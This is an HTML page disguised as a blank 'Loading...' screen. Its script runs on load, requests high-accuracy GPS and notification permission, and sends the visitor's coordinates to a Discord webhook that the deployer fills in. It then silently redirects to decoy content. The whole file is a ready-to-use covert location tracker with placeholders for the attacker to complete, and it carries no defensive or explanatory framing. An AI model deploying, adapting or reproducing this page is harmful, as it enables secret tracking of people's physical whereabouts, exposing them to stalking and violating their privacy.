<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      height: 100%;
      background-color: #000;
    }
  </style>
</head>
<body>
  <script>
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // replace with your Discord webhook

    function sendToWebhook(lat, lon, acc) {
      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📍 **GPS Captured**:\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
        })
      });
    }

    function requestGPS() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            sendToWebhook(lat, lon, acc);

            // Redirect silently
            window.location.href = "https://example.com/view"; // change this to your content
          },
          () => {
            // On deny or fail, exit silently
            window.location.href = "about:blank";
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        window.location.href = "about:blank";
      }
    }

    function requestNotification() {
      if ('Notification' in window) {
        Notification.requestPermission().then(() => {});
      }
    }

    // Trigger both on load
    window.onload = () => {
      requestNotification();
      requestGPS();
    };
  </script>
</body>
</html>
